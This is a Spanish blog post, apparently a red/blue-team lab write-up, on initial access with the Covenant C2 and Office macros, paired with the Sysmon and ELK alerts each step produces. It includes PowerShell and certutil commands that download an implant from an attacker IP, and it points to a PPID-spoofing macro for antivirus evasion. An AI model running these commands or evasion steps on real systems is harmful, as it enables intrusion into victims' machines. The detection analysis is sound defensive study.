---
title: Compromiso Incial
date: 2021-05-31 18:33:00 +02:00
license: false
show_edit_on_github: false
show_subscribe: false
---

En esta series de artículos intentare mostrar y detallar técnicas tanto ofensivas como defensivas.

Si deseas proponer alguna mejora, o algún comentario, ya sea duda o simplemente conocer más sobre esto, por favor, sin miedo escribe por telegram o twitter :)!


Infraestructura:

- Debian 10 , corriendo ELK
- Windows 10, ordenador del usuario, corriendo sysmon.
- Kali Linux, máquina atacante

A nivel de herramientas, utilizaré Covenant, como command and control.


Acceso Inicial

Una vez realizado el reconocimiento de la entidad a analizar y sus trabajadores, mediante técnicas de osint, por ejemplo. Debemos buscar el foothold en la entidad.

La principal manera para acceder internamente dentro de una organización es a través de las macros de office.

Surge un pequeñó problema, para ello necesitamos que el usuario active las macros pero resultará de manera sencilla ya que en una fase anterior, hemos recopilado toda información sobre el usuario, asique debemos utilizar la información consegida durante esa fase de reconocimiento y aplicarlo.



Es conveniente recalcar, que estás tecnicas realmenten funcionan, y cada cuál es libre de realizarlas.



Existen diferentes técnicas,  y diferentes formas para obtener un acceso inicial.

Tenemos opciones:

[T1566.001](https://attack.mitre.org/techniques/T1566/001/) 	Spearphishing Attachment
[T1566.002](https://attack.mitre.org/techniques/T1566/002/) 	Spearphishing Link
[T1566.003](https://attack.mitre.org/techniques/T1566/003/) 	Spearphishing via Service 

Dentro de estás formas, tenemos difentes técnicas, como dropper/downloadders, como la inyección en memoria.


Las macros que nos podemos encontrar son de dos tipo:

* Visual Basic macros VBA
* Excel 4.0

Y las funciones más comunes para realizar la ejecución son 
WorkBook_Open() o Document_Open(), Auto_Open()


Aunque existen otras, como Autocierre, Autoexit.

Realizaré dos ejemplos, en un primer ejermplo, utilizaremos la herramienta covenant como C2 y utilizaremos un fichero word con macros para instalar nuestra implante o grunt, como es conocido en covenant.

En un segundo ejemplo, utilizaremos Cobalt Strike como C2, y las macros Excel 4.0 como vector de acceso.


Covenant

En un primer paso, debemos crear un listener

![image001.png](/uploads/InitialAccess/image001.png)

El siguiente paso será configurar las opciones, debemos comprobar la dirección IP a la que queremos que se conecte nuestro grunt

![image002.png](/uploads/InitialAccess/image002.png)

El siguiente paso, será crear nuestro payload, nos vamos al tab Launchers

![image004.png](/uploads/InitialAccess/image004.png)

En este ejemplo, utilizamos un binario .net, pero podemos utilizar cualquuier otro.

Debemos especificar el listener, entre otros apartados. Y generamos nuestro primer launcher.

![image005.png](/uploads/InitialAccess/image005.png)

Una vez generado y descargado en nuestra máquina local, debemos enviarlo  al equipo del usuario.

Depende del escenario que nos encontremos, debemos realizar unas técnicas u otras.


Puede dar el caso, que tuviesemos acceso interno dentro de la organización, en este caso deberíamos desplegar el implante, esto es posible, levantando un servidor y realizando la descarga vía powershell , o  del binario certutil.exe 

A la hora de realizar este ejercicio, Windows Defenders saltará y nos eliminará el implante. Debemos identificar posibles bypasses, pero en este artítulo no entrarémos en ello.

![image006.png](/uploads/InitialAccess/image006.png)

Debemos tener en cuenta que saltará información si no conseguimos bypassear el AV
Para descargar el fichero utilize la expresión:

Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe


Se nos generan dos alertas

![image007.png](/uploads/InitialAccess/image007.png)

Una primera alerta, 
![image008.png](/uploads/InitialAccess/image008.png)

Y una segunda alerta,

![image009.png](/uploads/InitialAccess/image009.png)


Tenemos otras opciones para descargar el fichero, como puede ser certutil

certutil.exe -urlcache -split -f http://192.168.2.14:8000/GruntHTTP.exe grunt.exe


![image010.png](/uploads/InitialAccess/image010.png)


Como vemos los procesos son diferentes, a diferencia, no se llega a crear una alerta de network.



Ejecución
Se nos genera la siguiente información:

![image011.png](/uploads/InitialAccess/image011.png)






La primera alerta, la creación de un proceso

![image012.png](/uploads/InitialAccess/image012.png)

Conexión de red:

![image013.png](/uploads/InitialAccess/image013.png)

QueryDNS:

![image014.png](/uploads/InitialAccess/image014.png)

Conexión realiza, debería aparecernos un nuevo grunt.

![image015.png](/uploads/InitialAccess/image015.png)







Como decía anteriormente, el contexto mostrado ahora es diferete. Ya que nos encontramos fuera de la red y queremos acceder de manera interna.

En este caso, utilizaremos las macros de word. En concreto una especifíca para bypassear AV´s.

Parent PID and Command-line Argument Spoofing

[T1134](https://attack.mitre.org/techniques/T1134/004/)
`
PPID spoofing is a technique that allows attackers to start programs with arbitrary parent process set. This helps attackers make it look as if their programs were spawned by another process (instead of the one that would have spawned it if no spoofing was done) and it may help evade detections, that are based on parent/child process relationships. `

Utilizaremos esta macro : https://raw.githubusercontent.com/christophetd/spoofing-office-macro/master/macro64.vba



El primer paso, generamos la macro.

![image021.png](/uploads/InitialAccess/image021.png)


Y ya una vez ejecutado por el usuario. Nos genera la siguiente información.

![image022.png](/uploads/InitialAccess/image022.png)

El primer paso, es la creación de un proceso:

![image023.png](/uploads/InitialAccess/image023.png)

![image024.png](/uploads/InitialAccess/image024.png)
Elastic, nos genera 6 alertas recibiendo el nombre de Provider Lifecycle

Estas alertas, se tratan de activar diferentes providers, entre ellos son Variable, function, filesystem, Environment, Alias, Registry.


La información que contienen es la siguiente:

![image025.png](/uploads/InitialAccess/image025.png)

La siguiente alerta con código 4104, execute a command:

![image026.png](/uploads/InitialAccess/image026.png)

Siguiendo con las conexiones de red para descargar y establecimiento de la conexión 

![image027.png](/uploads/InitialAccess/image027.png)

Y por ultimo

![image028.png](/uploads/InitialAccess/image028.png)


Podemos seguir investigando con process explorer, vemos que powershell se ejecuta tras como un proceso hijo de explorer.exe

![image029.png](/uploads/InitialAccess/image029.png)

Podemos revisar las conexiónes de red, y ver que se tratan de procesos de powershell

![image030.png](/uploads/InitialAccess/image030.png)




